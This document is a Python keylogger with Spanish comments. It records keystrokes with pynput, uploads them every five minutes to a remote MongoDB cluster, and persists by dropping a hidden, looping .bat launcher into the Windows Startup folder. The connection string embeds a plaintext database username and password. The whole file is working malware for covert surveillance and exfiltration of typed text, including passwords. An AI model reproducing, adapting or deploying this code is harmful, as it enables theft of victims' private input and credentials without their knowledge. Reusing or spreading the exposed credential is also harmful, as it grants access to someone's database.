import os
import threading
import time
from pynput import keyboard
from pymongo import MongoClient

# Ruta del archivo Python actual
current_script = os.path.abspath(__file__)

# Ruta del archivo .bat que se creará en la carpeta de inicio
startup_folder = os.getenv('APPDATA') + r'\Microsoft\Windows\Start Menu\Programs\Startup'
bat_file_path = os.path.join(startup_folder, 'run_keylogger.bat')

# Definir la ruta a Visual Studio Code
vscode_path = r"C:\Users\yo\AppData\Local\Programs\Microsoft VS Code\Code.exe"  # Cambia a la ruta correcta de tu VS Code

def create_startup_file():
    # Contenido del archivo .bat modificado para incluir el bucle infinito
    bat_content = f'''@echo off
rem Verificar si Python está instalado
where python >nul 2>nul
if %ERRORLEVEL% neq 0 (
    echo Python no está instalado. Por favor, instale Python.
    exit /b
)

rem Instalar las dependencias necesarias
python -m pip install --upgrade pip
pip install pynput pymongo

rem Verificar si Visual Studio Code está instalado
if not exist "{vscode_path}" (
    echo Visual Studio Code no está instalado. Por favor, instale Visual Studio Code.
    exit /b
)

rem Ruta del script Python
set "PYTHON_SCRIPT={current_script}"

powershell -windowstyle hidden -command "try {{ python '{current_script}' }} catch {{ echo $_ | Out-File -FilePath '%log_file%' -Append; exit 1 }}"
    if %ERRORLEVEL% neq 0 (
        type %log_file%
        pause
        exit /b
    )
    
rem Bucle para ejecutar el script continuamente
:inicio
python %PYTHON_SCRIPT%
goto inicio
'''

    with open(bat_file_path, 'w') as bat_file:
        bat_file.write(bat_content)
        
    print(f'Archivo de inicio creado en: {bat_file_path}')

def main():
    # Conexión a MongoDB
    mongo_uri = "mongodb+srv://iraldejordan10:r5dcxq5RHNDrxt69@jarviscluster.et2fo.mongodb.net/"
    client = MongoClient(mongo_uri)
    db = client["keylogger_db"]       # Nombre de la base de datos
    collection = db["keystrokes"]     # Nombre de la colección

    # Lista para almacenar las teclas pulsadas
    keystrokes = []

    def on_press(key):
        try:
            keystrokes.append(key.char)
        except AttributeError:
            # Maneja teclas especiales
            if key == keyboard.Key.space:
                keystrokes.append(' ')
            elif key == keyboard.Key.enter:
                keystrokes.append('\n')
            elif key == keyboard.Key.tab:
                keystrokes.append('\t')
            elif key == keyboard.Key.backspace and keystrokes:
                keystrokes.pop()  # Eliminar la última tecla registrada en caso de backspace

    def store_keystrokes():
        while True:
            time.sleep(300)  # Ajusta el tiempo de espera según tus necesidades
            if keystrokes:
                # Unir las teclas en una sola cadena de texto
                data = ''.join(keystrokes)
                # Insertar en la colección
                collection.insert_one({"text": data})
                keystrokes.clear()  # Limpiar la lista después de almacenarla

    # Iniciar el hilo de almacenamiento en segundo plano
    store_thread = threading.Thread(target=store_keystrokes)
    store_thread.daemon = True
    store_thread.start()

    # Escuchar las teclas en segundo plano
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    # Crear el archivo de inicio solo la primera vez
    if not os.path.isfile(bat_file_path):
        create_startup_file()
    
    main()
